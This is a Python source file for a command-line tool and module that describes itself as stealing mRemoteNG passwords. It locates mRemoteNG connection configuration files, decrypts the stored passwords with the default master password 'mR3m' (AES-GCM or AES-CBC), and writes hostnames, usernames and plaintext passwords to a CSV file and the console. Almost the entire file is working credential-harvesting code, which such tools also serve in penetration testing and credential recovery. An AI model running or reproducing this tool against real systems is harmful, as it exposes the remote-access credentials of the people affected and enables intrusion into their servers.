#!/usr/bin/env python3
# -*- coding: utf-8 -*-

###################
#    This module steals mRemoteNG passwords.
#    Copyright (C) 2022  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

"""
This module steals mRemoteNG passwords.

>>> from mRemoteNGpasswordsStealer import Stealer
>>> stealer = Stealer()
>>> stealer = Stealer("mRemoteNG_passwords", "mR3m", r"C:\\Users\\Marine\\AppData\\Roaming\\mRemoteNG\\confCons.xml.20160622-*.backup", True)
>>> for host, user, password in stealer.parse_all():
...     print(host, user, password)
...
hostname username password
hostname username
>>> stealer.success_coutner
1
>>> stealer.errors_counter
1
>>>

~# python mRemoteNGpasswordsStealer.py
~# python mRemoteNGpasswordsStealer.py -c -p mR3m -f C:\\Users\\Marine\\AppData\\Roaming\\mRemoteNG\\confCons.xml.20160622-*.backup
"""

__version__ = "1.0.1"
__author__ = "Maurice Lambert"
__author_email__ = "mauricelambert434@gmail.com"
__maintainer__ = "Maurice Lambert"
__maintainer_email__ = "mauricelambert434@gmail.com"
__description__ = "This module steals mRemoteNG passwords."
license = "GPL-3.0 License"
__url__ = "https://github.com/mauricelambert/mRemoteNGpasswordsStealer"

copyright = """
mRemoteNGpasswordsStealer  Copyright (C) 2021, 2022  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.
"""
__license__ = license
__copyright__ = copyright

__all__ = ["Stealer", "main"]

print(copyright)

from argparse import ArgumentParser, Namespace
from PythonToolsKit.PrintF import printf
from Crypto.Util.Padding import unpad
from hashlib import pbkdf2_hmac, md5
from collections.abc import Iterator
from os.path import join, basename
from xml.dom.minidom import parse
from Crypto.Cipher import AES
from base64 import b64decode
from shutil import copyfile
from getpass import getuser
from time import strftime
from platform import node
from typing import Tuple
from csv import writer
from io import BytesIO
from os import environ
from glob import glob
from sys import exit


class Stealer:

    """
    This class steals mRemoteNG passwords.
    """

    def __init__(
        self,
        export_filename: str = "mRemoteNG_passwords",
        password: str = "mR3m",
        configuration_file: str = None,
        copyfiles: bool = False,
    ):
        self.time = strftime("%Y_%m_%d_%H_%M_%S")
        self.computer_name = node()
        self.user_name = getuser()
        self.copyfiles = copyfiles

        export_filename = self.export_filename = self.get_filename(
            export_filename, "csv"
        )
        export_file = self.export_file = open(export_filename, "w", newline="")
        self.files = self.get_configuration_files(configuration_file)
        self.export_csv = writer(export_file)
        self.password = password.encode()

        self.success_coutner = 0
        self.errors_counter = 0

    def get_filename(self, filename: str, extension: str) -> str:

        """
        This function returns a filename to save file.
        """

        return (
            f"{filename}_{self.computer_name}_"
            f"{self.user_name}_{self.time}.{extension}"
        )

    def gcm_decrypt(self, password: bytes) -> str:

        """
        This function decrypts GCM passwords.
        """

        password_buffer = BytesIO(password)

        salt = password_buffer.read(16)
        nonce = password_buffer.read(16)

        if not nonce:
            return ""

        data_tag = password_buffer.read()
        data = data_tag[:-16]
        tag = data_tag[-16:]

        key = pbkdf2_hmac("sha1", self.password, salt, 1000, dklen=32)

        cipher = AES.new(key, AES.MODE_GCM, nonce)
        cipher.update(salt)

        try:
            secrets = cipher.decrypt_and_verify(data, tag).decode()
        except ValueError:
            self.errors_counter += 1
            return ""
        else:
            self.success_coutner += 1

        return secrets

    def cbc_decrypt(self, password: bytes) -> str:

        """
        This function decrypts CBC passwords.
        """

        iv = password[:16]
        data = password[16:]

        cipher = AES.new(self.password, AES.MODE_CBC, iv)
        return unpad(cipher.decrypt(data), AES.block_size).decode()

    def decrypt(self, password: str) -> str:

        """
        This function decrypts mRemoteNG passwords.
        """

        password = b64decode(password.encode())
        return self._decrypt(password)

    def parse_all(self) -> Iterator[Tuple[str, str, str]]:

        """
        This function parses the mRemoteNG configuration files.
        """

        parser = self.parser
        for file in self.files:
            yield from parser(file)

    def parser(self, filename: str) -> Iterator[Tuple[str, str, str]]:

        """
        This function parses the mRemoteNG configuration file.
        """

        event = parse(filename).firstChild

        if event.nodeName != "mrng:Connections":
            raise ValueError("Configuration file is not valid.")

        block_cipher = event.attributes.getNamedItem("BlockCipherMode")

        if block_cipher is None:
            raise ValueError("Block cipher mode does not exists.")

        ciphername = block_cipher.nodeValue
        if ciphername != "GCM" and ciphername != "CBC":
            raise ValueError(
                f"Block cipher mode is not valid: {ciphername!r}."
            )

        if ciphername == "CBC":
            self.password = md5(self.password).digest()
            self._decrypt = self.cbc_decrypt
        elif ciphername == "GCM":
            self._decrypt = self.gcm_decrypt

        writerow = self.export_csv.writerow
        self.block_cipher = block_cipher
        decrypt = self.decrypt

        writerow(("Hostname", "Username", "Password"))

        for node in event.getElementsByTagName("Node"):
            username = node.attributes.getNamedItem("Username")
            hostname = node.attributes.getNamedItem("Hostname")
            password = node.attributes.getNamedItem("Password")

            if password is not None:
                password = decrypt(password.nodeValue)
            else:
                password = ""

            if username is not None:
                username = username.nodeValue
            else:
                username = ""

            if hostname is not None:
                hostname = hostname.nodeValue
            else:
                hostname = ""

            writerow((hostname, username, password))
            yield hostname, username, password

    def get_configuration_files(self, filename: str) -> str:

        """
        This function returns the default mRemoteNG configuration file.
        """

        files = glob(
            filename
            or join(
                environ["APPDATA"],
                "mRemoteNG",
                "confCons.xml*",
            )
        )

        if self.copyfiles:
            get_filename = self.get_filename
            for file in files:
                name, _, extension = basename(file).rpartition(".")
                copyfile(file, get_filename(name, extension))

        return files


def parse_args() -> Namespace:

    """
    This function parse command line arguments.
    """

    parser = ArgumentParser(
        description="This program steals mRemoteNG passwords."
    )
    add_argument = parser.add_argument

    add_argument(
        "-p", "--password", default="mR3m", help="mRemoteNG master password."
    )
    add_argument("-f", "--file", help="mRemoteNG configuration file.")
    add_argument(
        "-c",
        "--copy",
        "--copy-config",
        help="Copy mRemoteNG configuration file.",
        action="store_true",
        default=False,
    )
    add_argument(
        "-e",
        "--export",
        "--export-file",
        default="mRemoteNG_passwords",
        help="Export filename.",
    )

    return parser.parse_args()


def main() -> int:

    """
    This function steals mRemoteNG passwords
    from the command line.
    """

    arguments = parse_args()

    printf("Arguments are parsed.", "INFO")

    stealer = Stealer(
        arguments.export, arguments.password, arguments.file, arguments.copy
    )
    printf("Passwords stealer is built. Start parsing...", "INFO")

    try:
        for host, user, password in stealer.parse_all():
            printf(
                f"Host: {host!r}, Username: {user!r}, Password: {password!r}"
            )
    except ValueError as e:
        printf(f"ValueError: {e}", "ERROR")
        return 1

    success_coutner = stealer.success_coutner
    if success_coutner:
        printf(str(success_coutner) + " passwords decrypted.", "INFO")

    errors_counter = stealer.errors_counter
    if errors_counter:
        printf(str(errors_counter) + " passwords not decrypted.", "ERROR")
        printf(
            str(errors_counter) + " master password is probably incorrect.",
            "ERROR",
        )

    return 0


if __name__ == "__main__":
    exit(main())
